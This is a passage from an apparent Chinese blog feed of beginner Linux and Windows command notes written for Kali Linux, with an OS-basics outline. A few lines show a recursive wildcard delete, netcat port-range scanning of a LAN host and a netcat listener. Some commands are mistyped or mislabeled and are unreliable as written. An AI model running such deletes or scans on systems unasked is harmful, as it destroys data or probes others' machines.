&lt;&#x2F;span&gt;&lt;span&gt;cp -r dir dir       递归复制&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cp -r 04 05 09 03   复制多个文件到03&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cp -s               复制成为符号链接，也叫做捷径文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;rm                  删除文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;rm -f               强制删除，忽略不存在的文件，不会出现警告&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;rm -i               互动模式，删除之前会问你是否删除&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;rm -rf xxx          删除指定目录&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;rm -rf *            删除当前目录下的所有文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;文件内容查看：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;cat                  由第一行开始显示内容&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cat -n               添加行号显示，空行亦有&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cat -T               将Tab键以^I显示出来&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cat -v               列出一些看不出来的特殊符号&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cat -E               将结尾处的换行符用美元符号显示出来&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;tac                  从最后一行开始显示，跟cat相反&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nl                   添加行号显示，相当于cat -b&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;more                 一页一页的显示文件内容（查看大型文件）&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;less                 他可以往前翻页&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;head                 查看文件前几行，默认是前行&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;head -n 20           查看文件前20行&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;tail                 查看文件最后的几行，默认是10行&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;tail -n 20           &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;null&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cat null &amp;gt; xxx&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;echo                 用于输出字符串或提取shell变量的值&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;echo&amp;quot;hello&amp;quot;&amp;gt;04.txt   覆盖写&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;echo&amp;#39;命令&amp;#39;            执行命令并将其结果输出到终端&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;\n                   换行符，相当于回车&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;echo -e&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;grep                 用来查找文件里符合条件的内容&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;grep&amp;lt;要搜索的字符串&amp;gt;&amp;lt;要搜索的位置&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;grep -r http conf&#x2F;etc&#x2F;xxx.conf&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;| &amp;gt;                  管道符                 &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;||                   或&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;amp;                    后台执行&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;amp;&amp;amp;                   与&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;curl                 下载文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;curl -u              下载文件，提供用户名和密码&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;zip -r xxx.zip xxx   压缩&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;unzip xx             解压&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;tar zcf xxx.tar.gr   压缩&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;tar zxf              解压&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;系统管理：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sudo                   以管理员权限运行，必须拥有姓名&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;su xxx                 变更使用者身份&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;exit                   退出当前shell&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;reboot                 重启计算机&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;shutdown               关机&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;power off              关闭计算机电源&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;find                   查找和搜索文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;find&amp;lt;目录&amp;gt; -name&amp;lt;文件名&amp;gt; 查找指定目录下的文件，支持通配符&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;find      -iname        大小写不敏感&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;find&amp;lt;目录&amp;gt; -size&amp;lt;大小&amp;gt;   查看指定目录下满足某大小条件的文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;find.                   查找当前目录及其子目录下的所有文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;unname -a               显示系统用户名、 内核版本号、cpu等信息&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;date                    查看时间&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ps -ef                  用于显示所有进程信息&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ps -A                   &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ps -ef | grep&amp;lt;关键词&amp;gt;    查看指定进程信息&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;top                     用于实时显示进程的动态&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;kill                    用于删除执行中的程序&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;kill&amp;lt;PID&amp;gt;               终止进程&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;kill -KILL pid          强制杀死进程&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;kill -9 pid             彻底杀死进程&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;whoami                  显示用户名&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;who                     显示当前登录的用户&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;who -l -H               显示用户登录来源&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;whois                   查看域名描述信息&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;whois -p                指定端口查询域名&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;free                    显示内存使用信息&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;history                 查看用过的命令&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;网络：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;ping                     检测网络连通性&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ing -c 4                 ping 4个包&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ping -t                  一直ping&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ifconfig                 ipconfig&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ip add                   查看网络和配置信息&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;dhclient                 使用dhcp配置网络接口的网络参数&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;dhclient eth0            指定网卡上发送dhcp请求&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;dhclient -r              释放ip地址&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nslookup                 显示域名基本信息&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ssh root@92.168.1.1      登录指定用户名的主机&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ssh 192.168.1.1          登录服务器&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ssh root@192.168.1.1 -p 22   登录指定用户名和端口的主机&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ssh -t remoteserver1 ssh remoteserver2  从远程主机1跳到远程主机2&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ssh l name remoteserver &amp;lt;command&amp;gt;  连接到远程主机并执行远程主机的命令&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;netstat                  用于显示各种网络相关信息，如路由表、接口状态&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;netstat -a               &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;netstat -i               显示网卡列表&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;netstat -at              显示所有tcp连接&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;netstat -au              显示所有udp连接&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;netstat -l               列出监听中的连接&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;sodu netstat -ntlp       查看进程名、进程号pid、用户id等&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;netstat -r               显示路由信息&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;sudo netstat -anp | grep python   检查指定服务是否正常运行&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;sudo netstat -anp | grep :8000    检查指定端口的服务是否正常运行&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nc -nvv 192.168.68.130 8000       扫描8000端口&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nc -nvv -w2 -z 192.168.68.130 7900-8000   扫描7900-8000所有端口&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nc -l -p 8888             监听本机的80端口&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nc -nvv 192.168.1.1 8888  连接到192.168.1.1的tcp8888端口&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;用户和用户组管理&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;p&gt;
&lt;p&gt;用户账户的添加、删除、修改&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;useradd或者adduser&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;suod useradd&amp;lt;用户名&amp;gt;   三无账号：home下没有相应的目录；无密码；无系统shell&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;adduser&amp;lt;用户名&amp;gt;        创建新账户&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;useradd -m(创建home目录) -s(用户登陆后使用的shell) &#x2F;bin&#x2F;sh blazeboard -g pinginglab   创建新账户&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;passwd blazeboard     添加新密码&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;sudo username -g 1000 blazeboard  更改指定用户的组标识号&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;groupadd blazeboard   创建用户组&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;groupdel blazeboard   删除用户组&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;groupmod -n&amp;lt;目标用户组&amp;gt;&amp;lt;源用户组&amp;gt;   改名&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;groupmod -g 1005&amp;lt;用户组名&amp;gt;        更改用户组标识号&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;用户口令的管理&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;passwd  blazeboard     更改用户密码&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;vim编辑器基础&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;三种模式：普通模式、编辑模式、命令模式&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;普通模式:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;i进入编辑模式&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;k j h l光标上下左右移动&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;x删除当前光标所在的一个字符&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;dd删除当前行，并把删除的行保存到剪切板中&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;p粘贴剪切板&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a在光标后插入&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;o（小）在当前行后插入一个新行&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;O（大）在当前行前插入一个新行&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cw替换当前位置到下一个单词结尾&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;0（零）到行头&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;$到行尾&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;yy复制当前行&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;y复制选中内容&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;p粘贴&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;^&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;g&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;编辑模式:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;esc从编辑模式退出到普通模式&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;命令模式:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:wq保存并退出&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:q退出&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:q!强制退出&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:e&amp;lt;文件路径&amp;gt; 打开一个文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;![](images&#x2F;Kali Linux&#x2F;86755a296c74a087c390ed635a647ce.jpg)&lt;&#x2F;p&gt;
&lt;h3 id=&quot;huan-yuan-yu-ruan-jian&quot;&gt;换元与软件&lt;&#x2F;h3&gt;
&lt;p&gt;sudo nano &#x2F;etc&#x2F;apt&#x2F;sources.list&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;#阿里云&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;#中科大                                                           &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib   &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;apt updata&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Linux文件系统分层标准</title>
		<published>2020-07-24T00:00:00+00:00</published>
		<updated>2020-07-24T00:00:00+00:00</updated>
		<link href="https://baz.ee/linuxwen-jian-xi-tong-fen-ceng-biao-zhun/" type="text/html"/>
		<id>https://baz.ee/linuxwen-jian-xi-tong-fen-ceng-biao-zhun/</id>
		<content type="html">&lt;p&gt;&lt;img src=&quot;images&#x2F;Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E6%A0%87%E5%87%86&#x2F;1038b33437c725c8cc66852e4745d20.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>操作系统基础</title>
		<published>2020-07-23T00:00:00+00:00</published>
		<updated>2020-07-23T00:00:00+00:00</updated>
		<link href="https://baz.ee/cao-zuo-xi-tong-ji-chu/" type="text/html"/>
		<id>https://baz.ee/cao-zuo-xi-tong-ji-chu/</id>
		<content type="html">&lt;h1 id=&quot;cao-zuo-xi-tong-ji-chu&quot;&gt;操作系统基础&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;ji-suan-ji-xi-tong&quot;&gt;计算机系统&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;硬件系统
&lt;ul&gt;
&lt;li&gt;中央处理器
&lt;ul&gt;
&lt;li&gt;运算器&lt;&#x2F;li&gt;
&lt;li&gt;控制器&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;存储器
&lt;ul&gt;
&lt;li&gt;内部存储器&lt;&#x2F;li&gt;
&lt;li&gt;外部存储器&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;输入输出设备&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;ul&gt;
&lt;li&gt;软件系统
&lt;ul&gt;
&lt;li&gt;系统软件
&lt;ul&gt;
&lt;li&gt;操作系统
&lt;ul&gt;
&lt;li&gt;DOS&lt;&#x2F;li&gt;
&lt;li&gt;Windows&lt;&#x2F;li&gt;
&lt;li&gt;Linux
&lt;ul&gt;
&lt;li&gt;非常多的发行版&lt;&#x2F;li&gt;
&lt;li&gt;Debian系
&lt;ul&gt;
&lt;li&gt;Ubuntu&lt;&#x2F;li&gt;
&lt;li&gt;Debian&lt;&#x2F;li&gt;
&lt;li&gt;kali linux&lt;&#x2F;li&gt;
&lt;li&gt;Mint&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Redhat系
&lt;ul&gt;
&lt;li&gt;CentOS&lt;&#x2F;li&gt;
&lt;li&gt;Redhat&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Arch系
&lt;ul&gt;
&lt;li&gt;arch&lt;&#x2F;li&gt;
&lt;li&gt;manjaro&lt;&#x2F;li&gt;
&lt;li&gt;blackarch&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;其他&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;语言处理程序（汇编及其各种语言的编译、解释程序）
&lt;ul&gt;
&lt;li&gt;x86&lt;&#x2F;li&gt;
&lt;li&gt;arm&lt;&#x2F;li&gt;
&lt;li&gt;mips&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;系统实用程序&lt;&#x2F;li&gt;
&lt;li&gt;数据库管理程序&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;应用软件
&lt;ul&gt;
&lt;li&gt;程序库&lt;&#x2F;li&gt;
&lt;li&gt;软件包&lt;&#x2F;li&gt;
&lt;li&gt;用户自行开发的脚本&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200722104400597.png&quot; alt=&quot;image-20200722104400597&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200722095601037.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h4 id=&quot;feng-nuo-yi-man-jie-gou&quot;&gt;冯·诺依曼结构&lt;&#x2F;h4&gt;
&lt;p&gt;核心设计思想：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;二进制编码&lt;&#x2F;li&gt;
&lt;li&gt;程序和数据是存储在主存储器中的&lt;&#x2F;li&gt;
&lt;li&gt;确定了计算机的五个部分：运算器、控制器、存储器、输入设备、输出设备&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h4 id=&quot;ming-ling-xing-jie-mian-shell&quot;&gt;命令行界面：&lt;strong&gt;shell&lt;&#x2F;strong&gt;&lt;&#x2F;h4&gt;
&lt;p&gt;初识命令：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;win + R&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ipconfig：查看IP地址（没有空格！！！！！）&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ipconfig&#x2F;all&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ping www.baidu.com：检测主机的连通性&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;dir：查看当前路径下的文件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cd：跳转到某目录&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Tab键：自动补全&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;net user：列出当前计算机的用户&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;net user username &#x2F;add：创建用户&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;systeminfo：查看系统信息&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nslookup：显示默认服务器和ip地址&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;tasklist：列出当前进程的列表&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;route：操作网络路由表&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;services.msc：显示当前系统服务&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;regedit：打开注册表编辑器&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;control：打开控制面板&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;devmgmt.msc：打开设备管理器&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;netstat -an：查看开放的端口&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;help：帮助&lt;&#x2F;span&gt;&lt;span&gt;
